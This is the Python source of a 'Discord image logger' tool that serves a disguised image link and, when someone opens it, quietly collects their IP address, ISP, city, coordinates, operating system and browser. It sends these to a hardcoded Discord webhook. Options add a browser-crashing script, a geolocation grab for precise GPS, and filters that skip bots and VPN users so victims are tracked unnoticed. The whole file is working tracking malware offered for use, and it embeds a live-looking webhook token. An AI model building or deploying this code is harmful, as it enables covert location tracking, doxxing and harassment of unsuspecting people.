# Formerly named "Discord Image Logger" (its a good name but I dont want to get my account flagged/suspended!!)
# By DeKrypt | https://github.com/dekrypted
# Remade by fishyramen, 99.9% of credit goes to DeKrypt, (he's a genius like me) all i did was fix it to work again | https://github.com/fishyramen
# If it don't work it might be because when switching false to true or true to false you have to make the first letter in caps like "False" or "True" or it won't work!!

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "snatch blue"
__description__ = "just an info collecting tool"
__version__ = "v1.0"
__author__ = "fishyramen"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1469081437859741904/Mhf8qAenyS_C8962tfVBAzVY0cH4xrcNcvX8HMysBfz5NW7Lfg6By9EVWHXHVd6F9Hwa",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "snatch blue", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": False, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": True, # Redirect to a webpage?
        "page": "https://bigrat.monster/" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
